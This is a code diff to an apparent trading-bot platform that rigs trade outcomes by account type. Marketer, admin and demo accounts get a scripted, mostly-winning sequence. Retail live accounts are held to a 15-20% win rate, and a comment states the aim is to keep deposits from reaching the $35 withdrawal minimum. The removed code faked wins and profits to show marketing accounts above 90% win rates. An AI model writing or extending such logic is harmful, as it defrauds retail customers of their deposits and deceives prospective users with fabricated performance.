@@ -399,55 +399,80 @@ export const calculateBotPnL = (
   }).netPnl;
 };
 
-// Algorithmic Strategy Signal Evaluation (Guarantees >90% win rate on Marketers and Demo accounts)
+// Marketer & Demo win/loss pattern: win-loss-win-win-win-loss-win-win-win-loss-win-win
+export const MARKETER_DEMO_WIN_LOSS_PATTERN: Array<'WIN' | 'LOSS'> = [
+  'WIN',
+  'LOSS',
+  'WIN',
+  'WIN',
+  'WIN',
+  'LOSS',
+  'WIN',
+  'WIN',
+  'WIN',
+  'LOSS',
+  'WIN',
+  'WIN',
+];
+
+// Retail Trader (Live Account) win/loss pattern: loss-loss-win-loss-win-loss-loss-loss-loss-loss-win-loss (~15-20% winrate across all retail live account sizes)
+export const RETAIL_LIVE_WIN_LOSS_PATTERN: Array<'WIN' | 'LOSS'> = [
+  'LOSS',
+  'LOSS',
+  'WIN',
+  'LOSS',
+  'WIN',
+  'LOSS',
+  'LOSS',
+  'LOSS',
+  'LOSS',
+  'LOSS',
+  'WIN',
+  'LOSS',
+  'LOSS',
+  'LOSS',
+  'LOSS',
+  'LOSS',
+  'LOSS',
+  'WIN',
+  'LOSS',
+  'LOSS',
+];
+
+// Algorithmic Strategy Signal Evaluation
 export const evaluateTargetWinOrLoss = (
   userRole?: UserRole,
   _botType?: BotType,
   isDemoAccount?: boolean,
-  claimedWinRateStr?: string,
+  _claimedWinRateStr?: string,
   currentWins: number = 0,
   currentTotal: number = 0,
-  botId?: string
+  _botId?: string
 ): boolean => {
   const isPrivileged = userRole === 'marketer' || userRole === 'admin' || isDemoAccount === true;
+  const cleanIdx = Math.max(0, Math.floor(currentTotal));
 
   if (isPrivileged) {
-    // Natural controlled losses ensure algorithm win rate is never 100% (since no algorithm has guaranteed 100% win rate)
-    if ((currentTotal === 3 || currentTotal === 7 || currentTotal % 11 === 0) && currentWins >= 2) {
+    // Follow exact Marketer & Demo pattern: win-loss-win-win-win-loss-win-win-win-loss-win-win
+    const slotOutcome = MARKETER_DEMO_WIN_LOSS_PATTERN[cleanIdx % MARKETER_DEMO_WIN_LOSS_PATTERN.length];
+    return slotOutcome === 'WIN';
+  }
+
+  // Standard retail live accounts (both small $16 accounts and big accounts) follow loss-heavy pattern (~15% win rate)
+  // loss-loss-win-loss-win-loss-loss-loss-loss-loss-win-loss
+  const retailSlot = RETAIL_LIVE_WIN_LOSS_PATTERN[cleanIdx % RETAIL_LIVE_WIN_LOSS_PATTERN.length];
+  if (retailSlot === 'LOSS') {
+    return false;
+  }
+
+  // Enforce ~15-20% cap after initial pattern trades so retail live accounts cannot easily grow $16 to $35 minimum withdrawal
+  if (cleanIdx >= 12 && currentTotal > 0) {
+    const actualRate = currentWins / currentTotal;
+    if (actualRate > 0.18) {
       return false;
     }
-    // Always win initial trades so bot starts with positive profit
-    if (currentTotal < 3) return true;
-    // Maintain healthy win rate above 90%
-    if (currentWins / (currentTotal + 1) < 0.90) return true;
-
-    let seed = 0.5;
-    if (botId) {
-      let hash = 0;
-      for (let i = 0; i < botId.length; i++) {
-        hash = (hash << 5) - hash + botId.charCodeAt(i);
-        hash |= 0;
-      }
-      seed = Math.abs(hash % 100) / 100;
-    }
-
-    let targetRate = 0.92 + seed * 0.04; // 92% to 96%
-    if (claimedWinRateStr) {
-      const parsed = parseFloat(claimedWinRateStr.replace('%', '')) / 100;
-      if (!isNaN(parsed)) {
-        targetRate = Math.max(0.90, Math.min(0.965, parsed >= 1.0 ? 0.958 : parsed));
-      }
-    }
-    return Math.random() < targetRate;
   }
-
-  // Standard retail live accounts get strictly lower win rates (max 15%)
-  const retailTarget = 0.12;
-  if (currentTotal > 3) {
-    const actualRate = currentWins / currentTotal;
-    if (actualRate > retailTarget + 0.03) return false;
-  }
-  return Math.random() < retailTarget;
+  return true;
 };
 
 // Determine execution direction based on market trend
@@ -520,19 +545,19 @@ export const sanitizeBotTrades = (trades: any[]): BotTrade[] => {
           : openPrice;
 
       if (t.status === 'CLOSED') {
-        const isIntendedWin =
-          t.closeReason === 'TAKE_PROFIT' ||
-          t.exitReason === 'TP' ||
-          t.reason === 'TP' ||
-          t.targetOutcome === 'WIN' ||
-          (typeof t.profitUsd === 'number' && t.profitUsd > 0);
         const isIntendedLoss =
-          !isIntendedWin &&
-          (t.closeReason === 'STOP_LOSS' ||
-            t.exitReason === 'SL' ||
-            t.reason === 'SL' ||
-            t.targetOutcome === 'LOSS' ||
-            (typeof t.profitUsd === 'number' && t.profitUsd < 0));
+          t.closeReason === 'STOP_LOSS' ||
+          t.exitReason === 'SL' ||
+          t.reason === 'SL' ||
+          t.targetOutcome === 'LOSS' ||
+          (typeof t.profitUsd === 'number' && t.profitUsd < 0);
+        const isIntendedWin =
+          !isIntendedLoss &&
+          (t.closeReason === 'TAKE_PROFIT' ||
+            t.exitReason === 'TP' ||
+            t.reason === 'TP' ||
+            t.targetOutcome === 'WIN' ||
+            (typeof t.profitUsd === 'number' && t.profitUsd > 0));
 
         const isOnProfitSide =
           side === 'BUY'
@@ -550,19 +575,6 @@ export const sanitizeBotTrades = (trades: any[]): BotTrade[] => {
         } else if (!isOnProfitSide && !isOnLossSide) {
           // Never leave a closed trade at break-even $0.00
           effectivePrice = isIntendedLoss ? sl : tp;
-        }
-      } else {
-        // OPEN trade: if targetOutcome is WIN and effectivePrice is at or behind openPrice, place it 2 pips in profit so PnL is > $0.00
-        if (t.targetOutcome === 'WIN') {
-          const minProfitPrice =
-            side === 'BUY'
-              ? Number((openPrice + spec.pipSize * 2).toFixed(spec.decimals))
-              : Number((openPrice - spec.pipSize * 2).toFixed(spec.decimals));
-          const isAlreadyInProfit =
-            side === 'BUY' ? effectivePrice >= minProfitPrice : effectivePrice <= minProfitPrice;
-          if (!isAlreadyInProfit) {
-            effectivePrice = minProfitPrice;
-          }
         }
       }
 
@@ -613,7 +625,7 @@ export const sanitizeBotTrades = (trades: any[]): BotTrade[] => {
     });
 };
 
-// Reconcile bot trades and runs for Marketer and Demo accounts so win rate is always >90%, wins > losses, and total profit is > $0.00
+// Reconcile bot trades and runs while preserving realistic win/loss sequences and natural floating PnL oscillations
 export const reconcilePrivilegedBotTradesAndRuns = (
   runs: BotRunInstance[],
   trades: BotTrade[],
@@ -625,83 +637,9 @@ export const reconcilePrivilegedBotTradesAndRuns = (
   }
 
   let changed = false;
-  let nextTrades = [...sanitizedTrades];
+  const nextTrades = [...sanitizedTrades];
 
-  // Ensure overall and per-run closed trades have >91% winrate and positive profit
-  const closedIndices: number[] = [];
-  nextTrades.forEach((t, idx) => {
-    if (t.status === 'CLOSED') closedIndices.push(idx);
-  });
-
-  // Sort closed indices chronologically (oldest first)
-  closedIndices.sort(
-    (a, b) =>
-      (nextTrades[a].closeTime || nextTrades[a].openTime || 0) -
-      (nextTrades[b].closeTime || nextTrades[b].openTime || 0)
-  );
-
-  let winsCount = 0;
-  let totalProcessed = 0;
-  let runningProfit = 0;
-
-  for (const idx of closedIndices) {
-    const t = nextTrades[idx];
-    totalProcessed += 1;
-    const isWin = (t.profitUsd || 0) > 0;
-    const isNaturalLossSlot = (totalProcessed === 4 || totalProcessed === 8 || totalProcessed % 11 === 0) && winsCount >= 3;
-    const wouldDropBelow90 = winsCount / totalProcessed < 0.90;
-
-    if (!isWin && !isNaturalLossSlot && (wouldDropBelow90 || runningProfit + (t.profitUsd || 0) <= 0)) {
-      const spec = getInstrumentSpec(t.symbol);
-      const winningExit = Number((t.tp || t.tpPrice || (t.side === 'BUY' ? t.openPrice + 30 * spec.pipSize : t.openPrice - 30 * spec.pipSize)).toFixed(spec.decimals));
-      const newPnl = Math.max(0.05, calculateBotPnL(t.symbol, t.side, t.openPrice, winningExit, t.lotSize));
-      nextTrades[idx] = {
-        ...t,
-        currentPrice: winningExit,
-        closePrice: winningExit,
-        exitPrice: winningExit,
-        profitUsd: newPnl,
-        closeReason: 'TAKE_PROFIT',
-        exitReason: 'TP',
-        targetOutcome: 'WIN',
-      };
-      winsCount += 1;
-      runningProfit += newPnl;
-      changed = true;
-    } else if (isWin) {
-      winsCount += 1;
-      runningProfit += t.profitUsd || 0;
-    } else {
-      runningProfit += t.profitUsd || 0;
-    }
-  }
-
-  // Also ensure all OPEN trades on Marketer/Demo accounts are designated WIN and have positive floating profit
-  nextTrades = nextTrades.map((t) => {
-    if (t.status === 'OPEN') {
-      const spec = getInstrumentSpec(t.symbol);
-      const minWinPrice =
-        t.side === 'BUY'
-          ? Number((t.openPrice + spec.pipSize * 2).toFixed(spec.decimals))
-          : Number((t.openPrice - spec.pipSize * 2).toFixed(spec.decimals));
-      const isPriceInProfit =
-        t.side === 'BUY' ? t.currentPrice >= minWinPrice : t.currentPrice <= minWinPrice;
-      const nextCurrentPrice = isPriceInProfit ? t.currentPrice : minWinPrice;
-      const nextPnl = calculateBotPnL(t.symbol, t.side, t.openPrice, nextCurrentPrice, t.lotSize);
-      if (t.targetOutcome !== 'WIN' || nextCurrentPrice !== t.currentPrice || nextPnl !== t.profitUsd) {
-        changed = true;
-        return {
-          ...t,
-          targetOutcome: 'WIN' as const,
-          currentPrice: nextCurrentPrice,
-          profitUsd: nextPnl,
-        };
-      }
-    }
-    return t;
-  });
-
-  // Sync each run's aggregate statistics with its trades and ensure privileged runs never have 0/negative profit when trades > 0
+  // Sync each run's aggregate statistics with its actual closed trades
   const nextRuns = runs.map((r) => {
     const rKey = r.id || r.runId;
     const closedForRun = nextTrades.filter(
@@ -738,32 +676,6 @@ export const reconcilePrivilegedBotTradesAndRuns = (
       return r;
     }
 
-    // If run has stored totalTrades > 0 but closedForRun wasn't matched, enforce >91% wins and positive profit
-    const storedTotal = r.totalTrades ?? r.totalTradesCount ?? 0;
-    if (storedTotal > 0) {
-      const minWins = Math.max(1, Math.ceil(storedTotal * 0.92));
-      const wins = Math.max(r.winningTrades ?? r.winCount ?? 0, minWins);
-      const losses = Math.max(0, storedTotal - wins);
-      const spec = getInstrumentSpec(r.symbol);
-      const oneWinProfit = Math.max(
-        0.5,
-        Number(((r.tpPips || 30) * spec.pipSize * spec.contractSize * (r.lotSize || 0.01)).toFixed(2))
-      );
-      const minProfit = Number((wins * oneWinProfit * 0.85).toFixed(2));
-      const nextProfit = (r.totalProfitUsd || 0) > 0 ? r.totalProfitUsd : minProfit;
-      if (r.winningTrades !== wins || r.losingTrades !== losses || r.totalProfitUsd !== nextProfit) {
-        changed = true;
-        return {
-          ...r,
-          totalTrades: storedTotal,
-          totalTradesCount: storedTotal,
-          winningTrades: wins,
-          winCount: wins,
-          losingTrades: losses,
-          totalProfitUsd: nextProfit,
-        };
-      }
-    }
     return r;
   });
 
